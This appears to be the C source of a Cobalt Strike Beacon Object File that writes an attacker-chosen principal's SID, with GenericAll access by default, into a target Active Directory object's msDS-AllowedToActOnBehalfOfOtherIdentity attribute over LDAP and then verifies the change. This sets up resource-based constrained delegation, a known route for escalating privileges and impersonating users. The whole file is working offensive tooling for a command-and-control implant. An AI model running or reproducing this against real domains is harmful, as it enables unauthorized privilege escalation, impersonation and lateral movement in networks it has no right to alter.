#include <windows.h>
#include "../../_include/beacon.h"
#include "../common/ldap_common.c"
#include "../common/acl_common.c"

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    
    // Parse arguments:
    // target_identifier, is_target_dn, principal_identifier, is_principal_dn,
    // access_mask (optional - defaults to GenericAll), ace_type (optional),
    // search_ou, dc_address, use_ldaps
    char* targetIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTargetDN = BeaconDataInt(&parser);
    char* principalIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isPrincipalDN = BeaconDataInt(&parser);
    char* accessMaskStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* aceTypeStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* searchOu = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);
    
    if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
        return;
    }
    
    if (!principalIdentifier || MSVCRT$strlen(principalIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Principal identifier is required");
        return;
    }
    
    
    // Parse ACE parameters (use defaults if not provided)
    ACCESS_MASK accessMask = GENERIC_ALL; // Default to GenericAll for RBCD
    if (accessMaskStr && MSVCRT$strlen(accessMaskStr) > 0) {
        accessMask = ParseAccessMask(accessMaskStr);
        if (accessMask == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse access mask, using GenericAll");
            accessMask = GENERIC_ALL;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Access Mask: %s (0x%08x)", accessMaskStr, accessMask);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Access Mask: GenericAll (0x%08x) [default]", accessMask);
    }
    
    BYTE aceType = ACCESS_ALLOWED_ACE_TYPE; // Default to Allow
    if (aceTypeStr && MSVCRT$strlen(aceTypeStr) > 0) {
        aceType = ParseAceType(aceTypeStr);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Type: %s (0x%02x)", aceTypeStr, aceType);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Type: Allow (0x%02x) [default]", aceType);
    }
    
    if (searchOu && MSVCRT$strlen(searchOu) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Search OU: %s", searchOu);
    }
    
    if (dcAddress && MSVCRT$strlen(dcAddress) > 0) {
    }
    
    if (useLdaps) {
    }
    
    // Initialize LDAP connection
    char* dcHostname = NULL;
    LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
        return;
    }
    
    // Get default naming context
    char* defaultNC = NULL;
    char* targetDN = NULL;
    char* principalDN = NULL;
    
    defaultNC = GetDefaultNamingContext(ld, dcHostname);
    if (!defaultNC) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }
    
    // Resolve target DN
    if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetIdentifier) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) {
            MSVCRT$strcpy(targetDN, targetIdentifier);
        }
    } else {
        
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
        
        if (!targetDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
            BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found", targetIdentifier);
            MSVCRT$free(defaultNC);
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
    }
    
    // Resolve principal DN and get SID
    
    if (isPrincipalDN) {
        size_t len = MSVCRT$strlen(principalIdentifier) + 1;
        principalDN = (char*)MSVCRT$malloc(len);
        if (principalDN) {
            MSVCRT$strcpy(principalDN, principalIdentifier);
        }
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        principalDN = FindObjectDN(ld, principalIdentifier, searchBase);
        
        if (!principalDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve principal DN");
            BeaconPrintf(CALLBACK_ERROR, "[!] Principal '%s' not found", principalIdentifier);
            if (targetDN) MSVCRT$free(targetDN);
            MSVCRT$free(defaultNC);
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved principal DN: %s", principalDN);
    }
    
    // Get principal's objectSid
    PSID pPrincipalSid = GetObjectSid(ld, principalDN);
    
    if (!pPrincipalSid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve principal's objectSid");
        if (principalDN) MSVCRT$free(principalDN);
        if (targetDN) MSVCRT$free(targetDN);
        MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }
    
    if (!ADVAPI32$IsValidSid(pPrincipalSid)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Retrieved principal SID is invalid");
        MSVCRT$free(pPrincipalSid);
        if (principalDN) MSVCRT$free(principalDN);
        if (targetDN) MSVCRT$free(targetDN);
        MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }
    
    char* principalSidStr = SidToString(pPrincipalSid);
    if (principalSidStr) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Principal SID: %s", principalSidStr);
        MSVCRT$free(principalSidStr);
    }
    
    // Read current RBCD configuration (if any)
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Reading current RBCD configuration...");
    
    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    char* attrs[] = { "msDS-AllowedToActOnBehalfOfOtherIdentity", NULL };
    struct berval** values = NULL;
    BERVAL* currentRbcdBerval = NULL;

    ULONG result = WLDAP32$ldap_search_s(
        ld,
        targetDN,
        LDAP_SCOPE_BASE,
        "(objectClass=*)",
        attrs,
        0,
        &searchResult
    );

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to search for object");
        PrintLdapError("Search for RBCD attribute", result);
        goto cleanup;
    }

    entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Object not found");
        WLDAP32$ldap_msgfree(searchResult);
        goto cleanup;
    }

    // Get current RBCD configuration
    values = WLDAP32$ldap_get_values_len(ld, entry, "msDS-AllowedToActOnBehalfOfOtherIdentity");
    
    PACL pOldDacl = NULL;
    BOOL rbcdExists = FALSE;
    
    if (values && values[0]) {
        rbcdExists = TRUE;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found existing RBCD configuration (%d bytes)", values[0]->bv_len);
        
        // Allocate and copy
        currentRbcdBerval = (BERVAL*)MSVCRT$malloc(sizeof(BERVAL));
        if (currentRbcdBerval) {
            currentRbcdBerval->bv_len = values[0]->bv_len;
            currentRbcdBerval->bv_val = (char*)MSVCRT$malloc(currentRbcdBerval->bv_len);
            if (currentRbcdBerval->bv_val) {
                MSVCRT$memcpy(currentRbcdBerval->bv_val, values[0]->bv_val, currentRbcdBerval->bv_len);
            }
        }
        
        // Parse to get the DACL
        PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)values[0]->bv_val;
        BOOL daclPresent = FALSE;
        BOOL daclDefaulted = FALSE;
        
        if (ADVAPI32$GetSecurityDescriptorDacl(pSD, &daclPresent, &pOldDacl, &daclDefaulted)) {
            if (daclPresent && pOldDacl) {
                ACL_SIZE_INFORMATION aclInfo;
                if (ADVAPI32$GetAclInformation(pOldDacl, &aclInfo, sizeof(aclInfo), AclSizeInformation)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Current RBCD DACL has %d ACE(s)", aclInfo.AceCount);
                }
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Current RBCD has empty DACL");
            }
        }
        
        WLDAP32$ldap_value_free_len(values);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing RBCD configuration found, will create new one");
    }
    
    WLDAP32$ldap_msgfree(searchResult);
    
    // Create new DACL with the principal
    PACL pNewDacl = CreateNewDaclWithAce(
        pOldDacl,
        pPrincipalSid,
        accessMask,
        aceType,
        0, // No inheritance flags for RBCD
        NULL, // No object type GUID
        NULL  // No inherited object type GUID
    );
    
    if (!pNewDacl) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create new RBCD DACL");
        if (currentRbcdBerval) {
            if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
            MSVCRT$free(currentRbcdBerval);
        }
        goto cleanup;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created new RBCD DACL");
    
    // Create new security descriptor
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Building new RBCD security descriptor...");
    BYTE absoluteSDBuffer[SECURITY_DESCRIPTOR_MIN_LENGTH];
    PSECURITY_DESCRIPTOR pNewSD = (PSECURITY_DESCRIPTOR)absoluteSDBuffer;
    
    if (!ADVAPI32$InitializeSecurityDescriptor(pNewSD, SECURITY_DESCRIPTOR_REVISION)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize new security descriptor");
        MSVCRT$free(pNewDacl);
        if (currentRbcdBerval) {
            if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
            MSVCRT$free(currentRbcdBerval);
        }
        goto cleanup;
    }
    
    // Set the new DACL
    if (!ADVAPI32$SetSecurityDescriptorDacl(pNewSD, TRUE, pNewDacl, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set new DACL in security descriptor");
        MSVCRT$free(pNewDacl);
        if (currentRbcdBerval) {
            if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
            MSVCRT$free(currentRbcdBerval);
        }
        goto cleanup;
    }
    
    // Set owner and group in the security descriptor
    // For RBCD, we need valid owner/group or AD will reject with constraint violation
    if (rbcdExists && currentRbcdBerval && currentRbcdBerval->bv_val) {
        // If there was an existing SD, preserve owner and group
        PSECURITY_DESCRIPTOR pOldSD = (PSECURITY_DESCRIPTOR)currentRbcdBerval->bv_val;
        
        PSID pOwner = NULL;
        BOOL ownerDefaulted = FALSE;
        if (ADVAPI32$GetSecurityDescriptorOwner(pOldSD, &pOwner, &ownerDefaulted) && pOwner) {
            ADVAPI32$SetSecurityDescriptorOwner(pNewSD, pOwner, ownerDefaulted);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Preserved existing owner SID");
        }
        
        PSID pGroup = NULL;
        BOOL groupDefaulted = FALSE;
        if (ADVAPI32$GetSecurityDescriptorGroup(pOldSD, &pGroup, &groupDefaulted) && pGroup) {
            ADVAPI32$SetSecurityDescriptorGroup(pNewSD, pGroup, groupDefaulted);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Preserved existing group SID");
        }
    } else {
        // No existing RBCD - use the principal's SID as both owner and group
        // This is required by AD or we get constraint violation
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing RBCD - setting owner/group to principal SID");
        if (!ADVAPI32$SetSecurityDescriptorOwner(pNewSD, pPrincipalSid, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set owner in security descriptor");
            MSVCRT$free(pNewDacl);
            if (currentRbcdBerval) {
                if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
                MSVCRT$free(currentRbcdBerval);
            }
            goto cleanup;
        }
        if (!ADVAPI32$SetSecurityDescriptorGroup(pNewSD, pPrincipalSid, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set group in security descriptor");
            MSVCRT$free(pNewDacl);
            if (currentRbcdBerval) {
                if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
                MSVCRT$free(currentRbcdBerval);
            }
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner and group set successfully");
    }
    
    // Convert to self-relative format for LDAP
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Converting to self-relative format...");
    BERVAL* newRbcdBerval = ConvertSecurityDescriptorToBerval(pNewSD);
    
    if (!newRbcdBerval) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to BERVAL");
        MSVCRT$free(pNewDacl);
        if (currentRbcdBerval) {
            if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
            MSVCRT$free(currentRbcdBerval);
        }
        goto cleanup;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Converted to self-relative format (%d bytes)", newRbcdBerval->bv_len);
    
    // Write back to LDAP
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Writing RBCD configuration to LDAP...");
    
    struct berval* modValues[] = { newRbcdBerval, NULL };
    LDAPModA rbcdMod;
    rbcdMod.mod_op = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    rbcdMod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    rbcdMod.mod_vals.modv_bvals = modValues;
    
    LDAPModA* mods[] = { &rbcdMod, NULL };
    
    result = WLDAP32$ldap_modify_s(ld, targetDN, mods);
    
    if (result == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: RBCD configured successfully!");
        
        // Verify by reading back
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Verifying RBCD configuration...");
        
        LDAPMessage* verifyResult = NULL;
        result = WLDAP32$ldap_search_s(ld, targetDN, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &verifyResult);
        
        if (result == LDAP_SUCCESS) {
            LDAPMessage* verifyEntry = WLDAP32$ldap_first_entry(ld, verifyResult);
            if (verifyEntry) {
                struct berval** verifyValues = WLDAP32$ldap_get_values_len(ld, verifyEntry, "msDS-AllowedToActOnBehalfOfOtherIdentity");
                if (verifyValues && verifyValues[0]) {
                    PSD_INFO sdInfo = ParseSecurityDescriptor((BYTE*)verifyValues[0]->bv_val, verifyValues[0]->bv_len);
                    if (sdInfo) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Verification: RBCD DACL now has %d ACE(s)", sdInfo->DaclAceCount);
                        
                        // Check if our principal is present
                        char* checkSidStr = SidToString(pPrincipalSid);
                        BOOL foundPrincipal = FALSE;
                        
                        if (checkSidStr) {
                            for (DWORD i = 0; i < sdInfo->DaclAceCount && !foundPrincipal; i++) {
                                if (sdInfo->DaclAces[i].TrusteeSid && 
                                    MSVCRT$strcmp(sdInfo->DaclAces[i].TrusteeSid, checkSidStr) == 0) {
                                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Principal verified in RBCD DACL at index %d", i);
                                    foundPrincipal = TRUE;
                                }
                            }
                            MSVCRT$free(checkSidStr);
                        }
                        
                        if (!foundPrincipal) {
                            BeaconPrintf(CALLBACK_OUTPUT, "[!] Warning: Could not verify principal in RBCD DACL");
                        }
                        
                        FreeSecurityDescriptorInfo(sdInfo);
                    }
                    WLDAP32$ldap_value_free_len(verifyValues);
                }
            }
            WLDAP32$ldap_msgfree(verifyResult);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "\n[-] FAILED to configure RBCD");
        PrintLdapError("Modify RBCD attribute", result);
    }
    
    // Cleanup
    MSVCRT$free(pNewDacl);
    MSVCRT$free(newRbcdBerval->bv_val);
    MSVCRT$free(newRbcdBerval);
    if (currentRbcdBerval) {
        if (currentRbcdBerval->bv_val) MSVCRT$free(currentRbcdBerval->bv_val);
        MSVCRT$free(currentRbcdBerval);
    }

cleanup:
    if (pPrincipalSid) MSVCRT$free(pPrincipalSid);
    if (principalDN) MSVCRT$free(principalDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    if (dcHostname) MSVCRT$free(dcHostname);
    if (targetDN) MSVCRT$free(targetDN);
    CleanupLDAP(ld);
    
}